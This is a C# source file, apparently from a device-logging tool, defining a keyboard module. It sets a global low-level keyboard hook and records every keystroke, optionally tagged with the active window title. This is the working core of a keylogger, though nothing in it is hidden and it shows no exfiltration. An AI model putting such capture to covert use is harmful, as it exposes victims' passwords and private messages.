﻿using System;
using DeviceLog.Classes.Log;

namespace DeviceLog.Classes.Modules.Keyboard
{
    /// <summary>
    /// A class to enable or disable the keyboard hook and catch and pressed keys
    /// </summary>
    internal sealed class KeyboardModule
    {
        /// <summary>
        /// The KeyboardHook object that will be used to place a low-level keyboard hook and fire any events
        /// </summary>
        private readonly KeyboardHook _keyboardHook;
        /// <summary>
        /// The current keyboard log object
        /// </summary>
        private readonly KeyboardLog _log;

        /// <summary>
        /// The string value of the currently activated window title
        /// </summary>
        private string _currentWindowTitle;
        /// <summary>
        /// A boolean to indicate whether the activated window title should be logged or not
        /// </summary>
        private bool _windowTitle;
        /// <summary>
        /// The WindowModule that can retrieve the title of the active window
        /// </summary>
        private readonly WindowHook _windowModule;

        /// <summary>
        /// Initialize a new KeyboardModule
        /// </summary>
        /// <param name="special">A boolean to indicate whether special keys should be logged or not</param>
        /// <param name="control">A boolean to indicate whether control keys should be logged or not</param>
        /// <param name="enterKeyNewLine">A boolean to indicate whether the Enter key should be displayed as a new line or not</param>
        /// <param name="keyUp">A boolean to indicate wheter the KeyUp event should be fired or not</param>
        /// <param name="keyDown">A boolean to indicate whether the KeyDown event should be fired or not</param>
        /// <param name="windowTitle">A boolean to indicate whether the currently active window title should be logged or not</param>
        /// <param name="logController">The globally available LogController which holds the repository of logs</param>
        internal KeyboardModule(bool special, bool control, bool enterKeyNewLine, bool keyUp, bool keyDown, bool windowTitle, LogController logController)
        {
            _keyboardHook = new KeyboardHook(special, control, enterKeyNewLine);
            _log = new KeyboardLog();
            _windowModule = new WindowHook();

            _currentWindowTitle = "";
            _windowTitle = windowTitle;

            if (keyUp)
            {
                _keyboardHook.KeyUp += KeyPress;
            }

            if (keyDown)
            {
                _keyboardHook.KeyDown += KeyPress;
            }

            logController.AddLog(_log);
        }

        /// <summary>
        /// Set whether special characters should be logged or not
        /// </summary>
        /// <param name="log">A boolean to indicate whether special character should be logged or not</param>
        internal void SetLogSpecialCharacters(bool log)
        {
            _keyboardHook?.SetLogSpecialCharacters(log);
        }

        /// <summary>
        /// Set whether control characters should be logged or not
        /// </summary>
        /// <param name="log">A boolean to indicate whether control characters should be logged or not</param>
        internal void SetLogControlCharacters(bool log)
        {
            _keyboardHook?.SetLogControlCharacters(log);
        }

        /// <summary>
        /// Set whether an enter key should be displayed as a new line or not
        /// </summary>
        /// <param name="log">A boolean to indicate whether the enter key should be displayed as a new line or not</param>
        internal void SetLogEnterKeyNewLines(bool log)
        {
            _keyboardHook?.SetLogEnterKeyNewLines(log);
        }

        /// <summary>
        /// Set whether the active window title should be logged or not
        /// </summary>
        /// <param name="log">A boolean to indicate whether the active window title should be logged or not</param>
        internal void SetLogWindowTitle(bool log)
        {
            _windowTitle = log;
        }

        /// <summary>
        /// Method that will be fired when a KeyUp or KeyDown event is detected
        /// </summary>
        /// <param name="key">The string value of the key that was pressed</param>
        private void KeyPress(string key)
        {
            if (_windowTitle)
            {
                string title = _windowModule.GetActiveWindowTitle();
                if (title != null && _currentWindowTitle != title)
                {
                    if (!string.IsNullOrEmpty(_currentWindowTitle))
                    {
                        _log.AddData(Environment.NewLine);
                    }
                    _log.AddData("[" + title + "]");
                    _log.AddData(Environment.NewLine);

                    _currentWindowTitle = title;
                }
            }
            _log.AddData(key);
        }

        /// <summary>
        /// Start the low-level keyboard hook
        /// </summary>
        internal void Start()
        {
            _keyboardHook.Hook();
        }

        /// <summary>
        /// Stop and remove the low-level keyboard hook
        /// </summary>
        internal void Stop()
        {
            _keyboardHook.Unhook();
        }
    }
}
